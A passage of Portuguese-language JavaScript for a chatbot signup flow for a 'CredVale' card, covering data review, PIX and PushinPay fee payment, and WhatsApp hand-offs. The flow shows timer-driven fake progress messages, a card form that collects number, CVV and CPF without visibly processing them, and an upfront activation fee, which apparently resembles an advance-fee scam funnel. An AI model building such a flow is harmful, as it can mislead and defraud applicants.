  /* ---- BotÃµes Finais: Baixar App + Suporte (sem mensagem de conclusÃ£o) ---- */
  async function mostrarBotoesFinais(clientId, limite) {
    hideInput();

    addMsg(
      '<div style="display:flex;flex-direction:column;gap:10px;padding:4px 0;">' +
        '<button class="chat-option chat-option--primary" id="btnBaixarFim" style="width:100%;padding:16px;font-size:0.95rem;font-weight:700;">📲 Baixar Aplicativo</button>' +
      '</div>'
    );

    document.getElementById('btnBaixarFim').onclick = function() {
      showDownloadModalInChat(clientId, limite);
    };

    await sleep(200);

    addMsg(
      '<div style="text-align:center;padding:4px 0;">' +
        '<div style="font-size:0.82rem;color:#475569;line-height:1.5;margin-bottom:8px;">' +
          '💬 <strong>Precisa de ajuda?</strong> Nossa equipe está pronta para atender você.' +
        '</div>' +
        '<button class="chat-option" id="btnSuporteFim" style="width:100%;padding:14px;font-size:0.9rem;font-weight:600;border:1.5px solid #25D366;background:#ffffff;color:#075E54;">💬 Falar com um Atendente</button>' +
      '</div>'
    );

    document.getElementById('btnSuporteFim').onclick = function() {
      var wa = typeof __supportWhatsApp !== 'undefined' && __supportWhatsApp ? __supportWhatsApp : sessionStorage.getItem('vs_support_wa') || '5511999999999';
      wa = String(wa).replace(/\D/g,'');
      if (wa.length <= 11) wa = '55' + wa;
      window.open('https://wa.me/' + wa + '?text=Olá! Já sou cliente CredVale e preciso de ajuda.', '_blank');
    };

    addMsg(
      '<div style="display:flex;flex-direction:column;gap:10px;padding:4px 0;">' +
        '<button class="chat-option" id="btnAcessarContaFinal" style="width:100%;padding:14px;font-size:0.9rem;font-weight:600;border:1.5px solid #0B6CF4;background:#ffffff;color:#0B6CF4;">🔑 Acessar minha conta</button>' +
      '</div>'
    );

    document.getElementById('btnAcessarContaFinal').onclick = function() {
      window.location.href = '/cliente.html';
    };
  }

  /* ---- Continuar sem Plano ---- */
  async function continuarSemPlano(clientId, limite) {
    flowState = 'pos-plano';
    hideInput();

    addTyping();
    await sleep(800);
    removeTyping();

    var primeiroNome = (user.nome||'Cliente').split(' ')[0]||'Cliente';

    addMsg(
      '<div style="text-align:center;padding:8px 0;">'+
        '<div style="font-size:2rem;margin-bottom:6px;">\u2705</div>'+
        '<div style="font-size:1.1rem;font-weight:800;color:#0f172a;margin-bottom:4px;">Cadastro conclu\u00eddo, '+primeiroNome+'!</div>'+
        '<div style="font-size:0.8rem;color:#64748b;line-height:1.5;margin-bottom:8px;">'+
          'Seu cadastro foi finalizado com sucesso. Voc\u00ea pode assinar o <strong>Plano CredVale</strong> depois pelo aplicativo.'+
        '</div>'+
      '</div>',
      'bot'
    );

    await sleep(400);
    mostrarTelaFinal(clientId, limite);
  }

  /* ---- PÓS-PLANO: loading → mensagem na conversa com botões ---- */
  async function iniciarPosPlano(clientId, limite) {
    flowState = 'pos-plano';
    hideInput();

    var msgs = [
      'Preparando sua contratação...',
      'Gerando sua solicitação...',
      'Falta muito pouco...',
      'Estamos finalizando as últimas etapas...'
    ];

    showPopup(
      '<div style="text-align:center;padding:16px 0;">'+
        '<div style="width:52px;height:52px;margin:0 auto 14px;border:4px solid rgba(255,255,255,0.06);border-top-color:#4CC8A4;border-radius:50%;animation:spin 1s linear infinite;"></div>'+
        '<div style="font-weight:700;font-size:1rem;color:#0f172a;margin-bottom:4px;" id="loadingMsg">'+msgs[0]+'</div>'+
      '</div>'
    );

    var loadingEl = document.getElementById('loadingMsg');
    for (var i=1; i<msgs.length; i++) {
      await sleep(500);
      if (loadingEl) loadingEl.textContent = msgs[i];
    }
    await sleep(500);

    closePopup();

    var taxa = getPrecoStr(chosenCard);
    var nomePlano = chosenCard==='virtual' ? 'Standard' : 'Plus';
    var primeiroNome = (user.nome||'Cliente').split(' ')[0]||'Cliente';

    // Formatar dados
    var cpfFmt = user.cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,'$1.$2.$3-$4');
    var nascFmt = user.nascimento ? user.nascimento.split('-').reverse().join('/') : '—';
    var sexoLabel = user.sexo==='F'?'Feminino':user.sexo==='M'?'Masculino':user.sexo||'—';
    var enderecoFmt = (user.rua||'—')+', '+(user.numero||'s/n')+(user.complemento?' - '+user.complemento:'')+'<br>'+(user.bairro||'—')+' · '+(user.cidade||'—')+' - '+(user.uf||'—');
    var phoneFmt = user.whatsapp ? user.whatsapp.replace(/(\d{2})(\d{4,5})(\d{4})/,'($1) $2-$3') : '—';

    // Mensagem de revisão dos dados
    addMsg(
      '<div style="background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.06);border-radius:14px;padding:16px;margin-bottom:4px;">'+
        '<div style="font-size:0.85rem;font-weight:700;color:#0f172a;margin-bottom:10px;text-align:center;">📋 Revise seus dados</div>'+
        '<div style="display:flex;flex-direction:column;gap:4px;">'+
          '<div style="display:flex;justify-content:space-between;font-size:0.72rem;padding:5px 8px;border-radius:6px;background:rgba(255,255,255,0.02);"><span style="color:#475569;">Nome</span><span style="color:#0f172a;font-weight:600;text-align:right;">'+user.nome+'</span></div>'+
          '<div style="display:flex;justify-content:space-between;font-size:0.72rem;padding:5px 8px;border-radius:6px;"><span style="color:#475569;">CPF</span><span style="color:#0f172a;font-weight:600;text-align:right;">'+cpfFmt+'</span></div>'+
          '<div style="display:flex;justify-content:space-between;font-size:0.72rem;padding:5px 8px;border-radius:6px;background:rgba(255,255,255,0.02);"><span style="color:#475569;">Nascimento</span><span style="color:#0f172a;font-weight:600;text-align:right;">'+nascFmt+' · '+sexoLabel+'</span></div>'+
          '<div style="display:flex;justify-content:space-between;font-size:0.72rem;padding:5px 8px;border-radius:6px;"><span style="color:#475569;">Endereço</span><span style="color:#0f172a;font-weight:600;text-align:right;">'+enderecoFmt+'</span></div>'+
          '<div style="display:flex;justify-content:space-between;font-size:0.72rem;padding:5px 8px;border-radius:6px;background:rgba(255,255,255,0.02);"><span style="color:#475569;">WhatsApp</span><span style="color:#0f172a;font-weight:600;text-align:right;">'+phoneFmt+'</span></div>'+
          '<div style="display:flex;justify-content:space-between;font-size:0.72rem;padding:5px 8px;border-radius:6px;"><span style="color:#475569;">E-mail</span><span style="color:#0f172a;font-weight:600;text-align:right;">'+(user.email||'—')+'</span></div>'+
          '<div style="display:flex;justify-content:space-between;font-size:0.72rem;padding:5px 8px;border-radius:6px;background:rgba(255,255,255,0.02);"><span style="color:#475569;">Plano</span><span style="color:#4CC8A4;font-weight:700;text-align:right;">'+nomePlano+'</span></div>'+
        '</div>'+
      '</div>',
      'bot'
    );

    // Botão de confirmação
    var btnConfirmarDados = document.createElement('div');
    btnConfirmarDados.className = 'chat-msg chat-msg--bot';
    btnConfirmarDados.innerHTML =
      '<button class="chat-option chat-option--primary" id="btnConfirmarDados" style="width:100%;padding:14px;border-radius:12px;font-size:0.85rem;font-weight:700;cursor:pointer;border:none;background:linear-gradient(135deg,#059669,#10B981);color:#fff;box-shadow:0 4px 16px rgba(16,185,129,0.2);">✅ Tudo OK, continuar</button>';
    chatMsg.appendChild(btnConfirmarDados);
    scrollDown();

    document.getElementById('btnConfirmarDados').onclick = async function() {
      trackStage('Enviando Cadastro');
      btnConfirmarDados.remove();

      addMsg(
        '<div style="text-align:center;padding:4px 0;">'+
          '<div style="font-size:1.2rem;font-weight:900;color:#4CC8A4;margin-bottom:2px;">🎉 Perfeito, '+primeiroNome+'!</div>'+
          '<div style="font-size:0.85rem;color:#0f172a;"><strong>Plano '+nomePlano+'</strong> selecionado com sucesso.</div>'+
        '</div>',
        'bot'
      );

      // Indicador de carregamento antes da tela de decisão
      addTyping();
      await sleep(1500);
      removeTyping();

      mostrarDecisaoPagamento(clientId, limite, taxa);
    };
  }

  /* ---- DECISÃO: Pagar Agora ou Pagar Depois ---- */
  function mostrarDecisaoPagamento(clientId, limite, taxa) {
    hideInput();

    var primeiroNome = (user.nome||'Cliente').split(' ')[0]||'Cliente';
    var nomePlano = chosenCard==='virtual' ? 'Standard' : 'Plus';

    addMsg(
      '<div style="text-align:center;padding:6px 0;">'+
        '<div style="font-size:1.1rem;font-weight:800;color:#0f172a;margin-bottom:6px;">'+primeiroNome+',</div>'+
        '<div style="font-size:0.82rem;color:#475569;line-height:1.6;">'+
          'Efetue o pagamento da taxa de adesão do seu '+
          '<strong style="color:#4CC8A4;">Plano '+nomePlano+'</strong> para '+
          'concluir sua ativação e liberar todos os benefícios.'+
        '</div>'+
      '</div>',
      'bot'
    );

    // Container dos botões de decisão
    var decMsg = document.createElement('div');
    decMsg.className = 'chat-msg chat-msg--bot';
    decMsg.id = 'decisaoPagamento';
    decMsg.innerHTML =
      '<div style="display:flex;flex-direction:column;gap:10px;padding:4px 0;">'+
        '<button class="chat-option chat-option--primary" id="btnPagarAgora" style="width:100%;padding:14px;font-size:0.9rem;font-weight:700;">💳 Pagar Agora</button>'+
        '<button class="chat-option" id="btnPagarDepois" style="width:100%;padding:14px;font-size:0.9rem;font-weight:600;border:1.5px solid rgba(255,255,255,0.12);color:#475569;">⏰ Pagar Depois</button>'+
      '</div>';
    chatMsg.appendChild(decMsg);
    scrollDown();

    document.getElementById('btnPagarAgora').onclick = function() {
      var btnAgora = document.getElementById('btnPagarAgora');
      var btnDepois = document.getElementById('btnPagarDepois');
      // Mantém botão clicável para permitir nova tentativa
      if (btnAgora) {
        btnAgora.innerHTML = '⏳ Pagamento pendente — Tentar novamente';
      }
      if (btnDepois) {
        btnDepois.style.display = 'none';
      }
      addMsg('💳 <strong>Pagar agora</strong> selecionado','user');
      addMsg('<div class="chat-pending-bar">⏳ <strong>Pagamento pendente</strong><span class="chat-pending-dot"></span></div>','bot');
      mostrarBotoesPagamento(clientId, limite, taxa);
      // Mostra Baixar App + Suporte
      setTimeout(function() { mostrarTelaFinal(clientId, limite); }, 500);
    };

    document.getElementById('btnPagarDepois').onclick = function() {
      var btnAgora = document.getElementById('btnPagarAgora');
      var btnDepois = document.getElementById('btnPagarDepois');
      // Atualiza botões em vez de remover
      if (btnAgora) btnAgora.style.display = 'none';
      if (btnDepois) btnDepois.style.display = 'none';
      addMsg('⏰ <strong>Pagar depois</strong> selecionado','user');
      setTimeout(function() { mostrarOpcaoBaixarApp(clientId, limite); }, 300);
    };
  }

  /* ---- Pagar Depois → Baixar Aplicativo ---- */
  function mostrarOpcaoBaixarApp(clientId, limite) {
    var primeiroNome = (user.nome||'Cliente').split(' ')[0]||'Cliente';

    addMsg(
      '<div style="text-align:center;padding:8px 0;">'+
        '<div style="font-size:1.8rem;margin-bottom:6px;">📲</div>'+
        '<div style="font-size:1rem;font-weight:800;color:#0f172a;margin-bottom:4px;">Sem problemas, '+primeiroNome+'!</div>'+
        '<div style="font-size:0.82rem;color:#475569;line-height:1.5;margin-bottom:12px;">'+
          'Você pode pagar depois diretamente pelo aplicativo. '+
          '<strong style="color:#0f172a;">Baixe agora</strong> e finalize quando quiser.'+
        '</div>'+
      '</div>',
      'bot'
    );

    mostrarTelaFinal(clientId, limite);
  }

  /* ---- Botões de pagamento persistentes na conversa ---- */
  function mostrarBotoesPagamento(clientId, limite, taxa) {
    updateProgress(8);
    // Botão PIX
    var btnPix = document.createElement('div');
    btnPix.className = 'chat-msg chat-msg--bot';
    btnPix.innerHTML =
      '<button class="chat-option chat-option--primary" id="btnPagarPix" style="width:100%;padding:14px;font-size:0.9rem;font-weight:700;">💳 Pagar taxa de adesão com PIX</button>';
    chatMsg.appendChild(btnPix);
    scrollDown();

    document.getElementById('btnPagarPix').onclick = function() {
      modalPix(clientId, limite);
    };

    // Botão Cartão
    var btnCard = document.createElement('div');
    btnCard.className = 'chat-msg chat-msg--bot';
    btnCard.innerHTML =
      '<button class="chat-option chat-option--primary" id="btnPagarCartao" style="width:100%;padding:14px;font-size:0.9rem;font-weight:700;">💳 Pagar com Cartão de Crédito</button>';
    chatMsg.appendChild(btnCard);
    scrollDown();

    document.getElementById('btnPagarCartao').onclick = function() {
      modalCartao(clientId, limite);
    };

    // Botão Confirmar pagamento (sempre disponível)
    var btnConfirmar = document.createElement('div');
    btnConfirmar.className = 'chat-msg chat-msg--bot';
    btnConfirmar.id = 'msgConfirmarPagamento';
    btnConfirmar.innerHTML =
      '<div style="margin-top:4px;border-top:1px solid rgba(255,255,255,0.06);padding-top:8px;">'+
        '<button class="chat-option chat-option--primary" id="btnConfirmarPagamento" style="width:100%;padding:14px;font-size:0.9rem;font-weight:700;background:linear-gradient(135deg,#059669,#10B981);">✅ Confirmar pagamento</button>'+
      '</div>';
    chatMsg.appendChild(btnConfirmar);
    scrollDown();

    document.getElementById('btnConfirmarPagamento').onclick = function() {
      var nome = (user.nome||'').split(' ')[0]||'';
      var cpfLimpo = user.cpf||'00000000000';
      abrirWhatsAppVerificacao(clientId, limite, taxa, nome, cpfLimpo);
    };
  }

  /* ---- ETAPA 8B: Confirma Endereço (Cartão Físico) ---- */
  async function etapaConfirmarEndereco(clientId, limite) {
    flowState = 'addr-confirm';
    hideInput();
    await sleep(200);

    var endStr = (user.rua||'Rua')+', '+user.numero+(user.complemento?' - '+user.complemento:'')+'<br>'+(user.bairro||'Bairro')+' · '+(user.cidade||'Cidade')+' - '+(user.uf||'UF');

    var popHtml =
      '<div style="font-size:2rem;margin-bottom:8px;">📍</div>'+
      '<div class="popup-title">Confirmar Endereço de Entrega</div>'+
      '<div class="popup-subtitle">Seu cartão físico será enviado para:</div>'+
      '<div class="addr-confirm-card"><div class="addr-confirm-line">'+endStr+'</div></div>'+
      '<div class="addr-confirm-actions">'+
        '<button class="chat-option chat-option--primary" id="addrConfirmYes" style="flex:1;">✅ Sim, está correto</button>'+
      '</div>'+
      '<div style="margin-top:10px;">'+
        '<button class="chat-option" id="addrConfirmEdit" style="width:100%;">✏️ Quero editar o endereço</button>'+
      '</div>';

    showPopup(popHtml);

    document.getElementById('addrConfirmYes').onclick = function() {
      closePopup();
      setTimeout(function() { etapaConfirmacaoWhatsApp(clientId, limite); }, 300);
    };

    document.getElementById('addrConfirmEdit').onclick = function() {
      closePopup();
      addMsg('Qual o <strong>CEP</strong> correto?');
      setInput('Digite o CEP', 'cep');
      waitUserInput().then(function(cep) {
        cep = cep.replace(/\D/g,'');
        if (cep.length===8) {
          user.cep = cep;
          fetch('https://viacep.com.br/ws/'+cep+'/json/').then(function(r){ return r.json(); }).then(function(end){
            if (end && !end.erro) {
              user.rua = end.logradouro||user.rua;
              user.bairro = end.bairro||user.bairro;
              user.cidade = end.localidade||user.cidade;
              user.uf = end.uf||user.uf;
            }
            addMsg('Número?'); setInput('Número', 'number'); return waitUserInput();
          }).then(function(num){ user.numero=num; addMsg('Complemento? (ou —)'); setInput('Complemento ou —'); return waitUserInput(); })
          .then(function(c){ user.complemento=(c==='—'||c==='-')?'':c; etapaConfirmacaoWhatsApp(clientId, limite); });
        }
      });
    };
  }

  /* ---- ETAPA 9: Confirmação WhatsApp (antes do checkout) ---- */
  async function etapaConfirmacaoWhatsApp(clientId, limite) {
    flowState = 'wa-confirm';
    hideInput();
    await sleep(200);

    var phoneFmt = formatarTelefone(user.whatsapp);
    var popHtml =
      '<div style="font-size:2.5rem;margin-bottom:8px;">💬</div>'+
      '<div class="popup-title">Seu WhatsApp está correto?</div>'+
      '<div class="wa-confirm-number" style="font-size:1.4rem;font-weight:900;padding:16px 0;margin:8px 0;letter-spacing:1px;">'+phoneFmt+'</div>'+
      '<div class="wa-confirm-hint">'+
        '📌 <strong style="color:#4CC8A4;">Importante:</strong> É por este WhatsApp que você vai receber suas <strong style="color:#0f172a;">credenciais de acesso</strong> e o link para ativar seu cartão.'+
      '</div>'+
      '<div style="display:flex;gap:10px;margin-top:16px;">'+
        '<button class="chat-option chat-option--primary" id="waConfirmYes" style="flex:1;padding:14px;font-size:0.9rem;">✅ Sim, está correto</button>'+
        '<button class="chat-option chat-option--danger" id="waConfirmEdit" style="padding:14px;font-size:0.9rem;">✏️ Editar</button>'+
      '</div>';

    showPopup(popHtml);

    await new Promise(function(resolve) {
      document.getElementById('waConfirmYes').onclick = function() {
        closePopup();
        addMsg('WhatsApp confirmado: <strong>'+phoneFmt+'</strong>','user');
        resolve();
      };
      document.getElementById('waConfirmEdit').onclick = function() {
        closePopup();
        addMsg('Digite o <strong>número correto</strong> do WhatsApp:');
        setInput('(11) 99999-9999','phone');
        waitUserInput().then(function(p) {
          p = p.replace(/\D/g,'');
          if (p.length>=10) { user.whatsapp = p; hideInput(); }
          resolve();
        });
      };
    });

    await sleep(200);
    modalPix(clientId, limite);
  }

  /* ---- PIX MODAL ---- */
  function modalPix(clientId, limite) {
    flowState = 'pix';
    hideInput();

    var valor = getPreco(chosenCard);
    var apiBase = window.__API_BASE||'/api';
    var nomePrimeiro = (user.nome||'').split(' ')[0]||'';
    var cpfLimpo = user.cpf||'00000000000';

    // Loading enquanto consulta config
    showPopup(
      '<div style="text-align:center;padding:20px 0;">'+
        '<div style="width:52px;height:52px;margin:0 auto 16px;border:4px solid rgba(255,255,255,0.06);border-top-color:#4CC8A4;border-radius:50%;animation:spin 1s linear infinite;"></div>'+
        '<div style="font-weight:700;font-size:1rem;color:#0f172a;margin-bottom:4px;">Preparando pagamento...</div>'+
        '<div style="font-size:0.8rem;color:#475569;">Aguarde um momento</div>'+
      '</div>'
    );

    fetch(apiBase+'/payments/config').then(function(r){ return r.json(); }).then(function(config){
      var pushinpayUrl = (chosenCard==='fisico'
        ? (config.pushinpay_url_fisico||config.pushinpay_url||'')
        : (config.pushinpay_url_virtual||config.pushinpay_url||'')).trim();

      if (pushinpayUrl) {
        closePopup();
        showPushinpayPage(pushinpayUrl, clientId, limite);
        return;
      }

      // PushinPay inativo → gera PIX Copia e Cola via backend
      fetch(apiBase+'/payments/generate-pix', {
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({client_id:clientId, valor:valor})
      }).then(function(r){ return r.json(); }).then(function(data){
        closePopup();
        showPixCopiaCola(clientId, limite, data.pixCopiaCola, data.pixQrCode, valor, nomePrimeiro, cpfLimpo);
      }).catch(function(){
        closePopup();
        addMsg('Erro ao gerar pagamento. Tente novamente.','bot');
      });
    }).catch(function(){
      closePopup();
      addMsg('Erro ao carregar configuração de pagamento.','bot');
    });
  }

  /* ---- PushinPay: página com botão clicável ---- */
  function showPushinpayPage(url, clientId, limite) {
    var apiBase = window.__API_BASE||'/api';
    showPopup(
      '<div style="text-align:center;padding:8px 0;">'+
        '<div style="font-size:2rem;margin-bottom:4px;">🔗</div>'+
        '<div class="popup-title" style="font-size:1rem;">Pagamento PushinPay</div>'+
        '<div style="font-size:0.75rem;color:#475569;margin-bottom:14px;">Você será redirecionado para o checkout seguro</div>'+
        '<button class="chat-option chat-option--primary" id="pushinpayIr" style="width:100%;padding:14px;font-size:0.9rem;font-weight:700;">💚 Ir para o pagamento</button>'+
        '<div style="margin-top:10px;">'+
          '<button class="chat-option" id="pushinpayJaPaguei" style="width:100%;padding:10px;font-size:0.8rem;">✅ Já paguei — confirmar</button>'+
        '</div>'+
      '</div>'
    );

    document.getElementById('pushinpayIr').onclick = function() {
      try { navigator.sendBeacon(apiBase+'/track/pushinpay-click', new Blob([JSON.stringify({client_id:clientId,plano:chosenCard})], {type:'application/json'})); } catch(e){}
      window.open(url, '_blank');
    };

    document.getElementById('pushinpayJaPaguei').onclick = function() {
      closePopup();
      var taxa = getPrecoStr(chosenCard);
      var cpfLimpo = user.cpf||'00000000000';
      abrirWhatsAppVerificacao(clientId, limite, taxa, (user.nome||'').split(' ')[0]||'', cpfLimpo);
    };
  }

  /* ---- PIX Copia e Cola (fallback quando PushinPay inativo) ---- */
  function showPixCopiaCola(clientId, limite, copiaCola, qrCodeUrl, valor, nomePrimeiro, cpfLimpo) {
    var taxa = 'R$ '+valor.toFixed(2).replace('.',',');

    var pixHtml =
      '<div style="text-align:center;margin-bottom:8px;">'+
        '<div style="font-size:1.6rem;margin-bottom:2px;">💚</div>'+
        '<div class="popup-title" style="font-size:1rem;">Pagamento via PIX</div>'+
        '<div style="font-size:0.75rem;color:#475569;margin-bottom:4px;">Valor: <strong style="color:#4CC8A4;">'+taxa+'</strong></div>'+
        '<div style="font-size:0.7rem;color:#475569;">Escaneie o QR Code abaixo ou copie o código PIX</div>'+
      '</div>'+

      '<div style="text-align:center;margin-bottom:10px;">'+
        '<div style="width:200px;height:200px;margin:0 auto;border-radius:12px;overflow:hidden;background:#fff;display:flex;align-items:center;justify-content:center;box-shadow:0 4px 20px rgba(0,0,0,0.3);border:2px solid rgba(255,255,255,0.06);">'+
          '<img src="'+qrCodeUrl+'" alt="QR Code PIX" style="width:100%;height:100%;object-fit:contain;">'+
        '</div>'+
      '</div>'+

      '<div style="background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);border-radius:12px;padding:10px;margin-bottom:8px;">'+
        '<div style="font-size:0.65rem;color:#475569;margin-bottom:3px;">Código PIX Copia e Cola:</div>'+
        '<div style="background:rgba(0,0,0,0.3);border-radius:8px;padding:8px;font-size:0.65rem;color:#475569;word-break:break-all;font-family:monospace;text-align:center;margin-bottom:6px;border:1px solid rgba(255,255,255,0.04);max-height:60px;overflow-y:auto;">'+copiaCola+'</div>'+
        '<button class="chat-option chat-option--primary" id="pixCopiarChave" style="width:100%;padding:9px;font-size:0.8rem;">📋 Copiar código PIX</button>'+
      '</div>'+

      '<div style="display:flex;flex-direction:column;gap:4px;">'+
        '<button class="chat-option" id="pixJaPaguei" style="width:100%;padding:10px;font-size:0.8rem;">✅ Já paguei — confirmar</button>'+
      '</div>';

    showPopup(pixHtml);

    document.getElementById('pixCopiarChave').onclick = function() {
      try { navigator.sendBeacon((window.__API_BASE||'/api')+'/track/pix-copy', new Blob([JSON.stringify({client_id:clientId})], {type:'application/json'})); } catch(e){}
      navigator.clipboard.writeText(copiaCola).then(function() {
        closePopup();
        showPopup(
          '<div style="text-align:center;">'+
            '<div style="width:56px;height:56px;margin:0 auto 10px;background:rgba(76,200,164,0.12);border-radius:50%;display:flex;align-items:center;justify-content:center;border:1px solid rgba(76,200,164,0.2);">'+
              '<span style="font-size:1.8rem;color:#4CC8A4;">✓</span>'+
            '</div>'+
            '<div style="font-size:0.8rem;color:#4CC8A4;font-weight:700;text-transform:uppercase;margin-bottom:4px;">✅ Código PIX copiado</div>'+
            '<div style="font-size:0.85rem;color:#475569;margin-bottom:10px;line-height:1.4;">'+
              'Agora <strong style="color:#0f172a;">abra seu banco</strong>, vá em <strong style="color:#0f172a;">Pix</strong> e cole o código para pagar.'+
            '</div>'+
            '<div style="background:rgba(76,200,164,0.06);border:1px solid rgba(76,200,164,0.12);border-radius:12px;padding:12px;margin:0 0 12px;font-size:0.8rem;color:#475569;text-align:left;line-height:1.5;">'+
              '📌 <strong>Importante:</strong> Fique atento ao <strong>WhatsApp</strong>. É por lá que você vai receber as credenciais e confirmação do seu cartão.'+
            '</div>'+
            '<button class="chat-option chat-option--primary" id="pixCopiarOk" style="width:100%;padding:12px;font-size:0.85rem;">✅ Entendi, vou pagar</button>'+
          '</div>'
        );
        document.getElementById('pixCopiarOk').onclick = function() {
          closePopup();
          addMsg('💚 Ok, vou pagar o PIX agora!','user');
          addMsg('<div class="chat-pending-bar">⏳ <strong>Pagamento pendente</strong><span class="chat-pending-dot"></span></div>','bot');
          var appMsg = document.createElement('div');
          appMsg.className = 'chat-msg chat-msg--bot';
          appMsg.innerHTML = '<button class="chat-option chat-option--primary" id="btnBaixarAppPendente" style="width:100%;padding:12px;font-size:0.85rem;font-weight:700;">📲 Baixar Aplicativo</button>';
          chatMsg.appendChild(appMsg); scrollDown();
          document.getElementById('btnBaixarAppPendente').onclick = function() {
            showDownloadModalInChat(clientId, limite);
          };
        };
      }).catch(function() {
        var ta = document.createElement('textarea');
        ta.value = copiaCola; ta.style.position='fixed'; ta.style.opacity='0';
        document.body.appendChild(ta); ta.select(); document.execCommand('copy');
        ta.remove();
        closePopup();
        addMsg('💚 Ok, vou pagar o PIX agora!','user');
        addMsg('<div class="chat-pending-bar">⏳ <strong>Pagamento pendente</strong><span class="chat-pending-dot"></span></div>','bot');
        var appMsg2 = document.createElement('div');
        appMsg2.className = 'chat-msg chat-msg--bot';
        appMsg2.innerHTML = '<button class="chat-option chat-option--primary" id="btnBaixarAppPendente2" style="width:100%;padding:12px;font-size:0.85rem;font-weight:700;">📲 Baixar Aplicativo</button>';
        chatMsg.appendChild(appMsg2); scrollDown();
        document.getElementById('btnBaixarAppPendente2').onclick = function() {
          showDownloadModalInChat(clientId, limite);
        };
      });
    };

    document.getElementById('pixJaPaguei').onclick = function() {
      closePopup();
      abrirWhatsAppVerificacao(clientId, limite, taxa, nomePrimeiro, cpfLimpo);
    };
  }

  /* ---- CARTÃO MODAL ---- */
  function modalCartao(clientId, limite) {
    flowState = 'card-form';
    hideInput();
    var taxa = getPrecoStr(chosenCard);

    var cardHtml =
      '<div style="text-align:center;margin-bottom:14px;">'+
        '<div style="font-size:2rem;margin-bottom:4px;">💳</div>'+
        '<div class="popup-title">Cartão de Crédito</div>'+
        '<div style="font-size:0.85rem;color:#475569;">Taxa de emissão: <strong style="color:#4CC8A4;">'+taxa+'</strong></div>'+
      '</div>'+
      '<div style="display:flex;flex-direction:column;gap:12px;">'+
        '<input placeholder="Número do cartão" class="pix-input" id="cardNumero" maxlength="19" style="padding:14px;border-radius:12px;border:1.5px solid rgba(255,255,255,0.08);background:rgba(255,255,255,0.04);color:#fff;font-size:0.9rem;font-family:inherit;outline:none;">'+
        '<div style="display:flex;gap:10px;">'+
          '<input placeholder="Validade" class="pix-input" id="cardValidade" maxlength="5" style="flex:1;padding:14px;border-radius:12px;border:1.5px solid rgba(255,255,255,0.08);background:rgba(255,255,255,0.04);color:#fff;font-size:0.9rem;font-family:inherit;outline:none;">'+
          '<input placeholder="CVV" class="pix-input" id="cardCvv" maxlength="4" style="flex:1;padding:14px;border-radius:12px;border:1.5px solid rgba(255,255,255,0.08);background:rgba(255,255,255,0.04);color:#fff;font-size:0.9rem;font-family:inherit;outline:none;">'+
        '</div>'+
        '<input placeholder="Nome do titular" class="pix-input" id="cardTitular" style="padding:14px;border-radius:12px;border:1.5px solid rgba(255,255,255,0.08);background:rgba(255,255,255,0.04);color:#fff;font-size:0.9rem;font-family:inherit;outline:none;">'+
        '<input placeholder="CPF do titular" class="pix-input" id="cardCpf" maxlength="14" style="padding:14px;border-radius:12px;border:1.5px solid rgba(255,255,255,0.08);background:rgba(255,255,255,0.04);color:#fff;font-size:0.9rem;font-family:inherit;outline:none;">'+
        '<button class="chat-option chat-option--primary" id="cardPagar" style="width:100%;padding:16px;font-size:1rem;margin-top:4px;">💳 Pagar '+taxa+'</button>'+
        '<div style="text-align:center;font-size:0.7rem;color:#475569;">🔒 Dados protegidos · Pagamento seguro</div>'+
      '</div>';

    showPopup(cardHtml);

    document.getElementById('cardPagar').onclick = function() {
      var nome = (user.nome||'').split(' ')[0]||'';
      var cpfLimpo = user.cpf||'00000000000';
      closePopup();
      addMsg('💳 <strong>Pagamento com cartão solicitado.</strong> Em breve entraremos em contato para confirmar.','bot');
      setTimeout(function() {
        abrirWhatsAppVerificacao(clientId, limite, taxa, nome, cpfLimpo);
      }, 500);
    };
  }

  /* ---- Abrir WhatsApp com mensagem pré-definida ---- */
  function abrirWhatsAppVerificacao(clientId, limite, taxa, nome, cpf) {
    var support = __supportWhatsApp || sessionStorage.getItem('vs_support_wa') || '5511999999999';
    var phone = support.replace(/\D/g,'');
    var msg = encodeURIComponent(
      'Ol\u00e1! Meu nome \u00e9 '+nome+', CPF '+cpf+'. '+
      'Acabei de efetuar o pagamento da taxa de ativa\u00e7\u00e3o do meu cart\u00e3o '+(chosenCard==='virtual'?'Virtual (Standard)':'F\u00edsico (Plus)')+'. '+
      'Gostaria de confirmar o recebimento e dar continuidade \u00e0 ativa\u00e7\u00e3o. Obrigado!'
    );
    window.open('https://wa.me/55'+phone+'?text='+msg, '_blank');
  }

  /* ---- Utilitários ---- */
  async function verificarCPFExistente(cpf) {
    try {
      var client = await API.getClientByCpf(cpf);
      if (!client||!client.id) return false;
      var nome = client.nome||'';
      var primeiroNome = nome.split(' ')[0]||'';
      var limite = client.limite_aprovado||0;
      sessionStorage.setItem('vs_clientId', client.id);
      sessionStorage.setItem('vs_nome', primeiroNome);
      sessionStorage.setItem('vs_nome_completo', nome);
      sessionStorage.setItem('vs_limite', limite);
      // Atualiza device info do cliente com os dados da sessão atual
      try {
        var dd = getDeviceInfo();
        API.updateClientDevice(client.id, { dispositivo: dd.dispositivo, modelo: dd.modelo, fabricante: dd.fabricante, os: dd.os, navegador: dd.navegador, navegador_versao: dd.navegador_versao });
      } catch(e) {}
      addMsg('👋 Olá novamente, <strong>'+primeiroNome+'</strong>! Localizamos seu cadastro.', 'bot');
      hideInput(); await sleep(1200);
      if (client.status==='aprovado'||client.status==='ativado') {
        addMsg(
          '<div style="text-align:center;padding:8px 0;">'+
            '<div style="font-size:2.8rem;margin-bottom:10px;">✅</div>'+
            '<div style="font-size:1.1rem;font-weight:900;color:#0f172a;margin-bottom:4px;">Você já possui um cadastro ativo no <strong style="background:linear-gradient(135deg,#4CC8A4,#3B82F6);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;">CredVale</strong>.</div>'+
            '<div style="font-size:0.8rem;color:#475569;margin-bottom:12px;line-height:1.5;">Seu acesso já foi aprovado anteriormente. Utilize uma das opções abaixo para continuar.</div>'+
            '<div style="display:flex;flex-direction:column;gap:8px;">'+
              '<button class="chat-option chat-option--primary" id="btnBaixarApp" style="padding:12px;font-size:0.85rem;">📲 Baixar Aplicativo</button>'+
              '<button class="chat-option" id="btnFalarSuporte" style="padding:12px;font-size:0.85rem;">💬 Falar com um Atendente</button>'+
